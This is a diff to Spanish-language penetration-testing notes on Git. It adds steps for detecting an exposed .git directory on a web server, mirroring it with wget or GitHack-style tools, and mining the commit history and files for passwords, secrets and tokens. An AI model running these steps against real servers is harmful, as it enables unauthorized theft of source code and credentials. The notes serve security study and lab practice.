@@ -3,10 +3,54 @@
 Tags: #GIT 
 
 **Git** es una herramienta para llevar el historial de cambios de un proyecto. Guarda versiones de los archivos para que puedas ver qué cambió, recuperar una versión anterior y colaborar con otras personas.
-## Enumeración credenciales 
+
+## Enumerar desde Web - Repositorio .git expuesto
+
+```bash
+# Puedes encontrar el '/.git' haciendo fuzzing en el server 
+
+Paso 1:
+# Si al consultar devuelve algo esta expuesto 
+❯ curl http://<IP>/.git/HEAD
+
+	ref: refs/heads/main
+
+Paso 2:
+# Traer todo el proyecto a Kali 
+❯ wget -r "http://IP_Server/.git/"
+
+Paso 3:
+# Mirar los commits ya que contienen creds 
+❯ git log
+	commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+
+❯ git show 44a055daf7a0cd777f28f444c0d29ddf3ff08c54
+
+# Después de extraer → buscar credenciales (Opcional)
+❯ grep -ri "password\|passwd\|secret\|key\|token" ./ 2>/dev/null
+```
+
+* [GitHack.py](https://github.com/lijiejie/githack)
 ```bash 
-# Enumerar en un dir si existe un .git 
+# Instalación (Opcional)
+❯ git clone https://github.com/lijiejie/githack && cd githack
+
+❯ python3 GitHack.py http://<IP>/.git/
+# Extraer todos los recursos del proyecto
+# Puede contener: credenciales, código fuente, historial de commits
+
+# Otras tools 
+❯ git_hacker.py http://<IP>/.git/
+❯ git-dump.py http://<IP>/.git/
+```
+
+## Enumeración de credenciales desde un directorio 
+```bash 
+# Enumerar un dir para ver si existe un proyecto .git 
 ❯ ls -la 
+
+NOTA:
+	- Enumerar en carpetas .zip que se descarguen de algun servicio como FTP, WEB, etc...
 ```
 
 ```bash 
